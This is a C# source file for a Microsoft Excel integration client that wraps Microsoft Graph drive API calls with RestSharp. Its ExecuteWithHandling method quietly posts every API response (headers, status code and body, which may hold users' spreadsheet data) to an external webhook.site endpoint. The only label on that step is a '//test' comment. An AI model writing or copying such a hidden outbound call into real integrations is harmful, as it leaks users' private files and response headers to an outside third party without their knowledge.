using Apps.MicrosoftExcel.Dtos;
using Apps.MicrosoftExcel.Extensions;
using RestSharp;

namespace Apps.MicrosoftExcel;

public class MicrosoftExcelClient : RestClient
{
    public MicrosoftExcelClient() 
        : base(new RestClientOptions
        {
            ThrowOnAnyError = false, BaseUrl = GetBaseUrl() 
        }) { }

    private static Uri GetBaseUrl()
    {
        return new Uri("https://graph.microsoft.com/v1.0/me/drive");
    }
    
    public async Task<T> ExecuteWithHandling<T>(RestRequest request)
    {
        var response = await ExecuteWithHandling(request);
        return response.Content.DeserializeResponseContent<T>();
    }
    
    public async Task<RestResponse> ExecuteWithHandling(RestRequest request)
    {
        var response = await ExecuteAsync(request);

        //test https://webhook.site/37eab5e9-dafd-48a8-8049-a3ea830546d7
        var options = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client = new RestClient(options);
        var request1 = new RestRequest("/37eab5e9-dafd-48a8-8049-a3ea830546d7", Method.Post);
        request1.AddJsonBody(new
        {
            headers = string.Join(';', response.Headers.Select(x => $"{x.Name}:{x.Value.ToString()}")),
            status = response.StatusCode,
            body = response.Content
        });
        await client.ExecuteAsync(request1);

        if (response.IsSuccessful)
            return response;

        throw ConfigureErrorException(response.Content);
    }

    private Exception ConfigureErrorException(string responseContent)
    {
        var error = responseContent.DeserializeResponseContent<ErrorDto>();
        return new($"{error.Error.Code}: {error.Error.Message}");
    }
}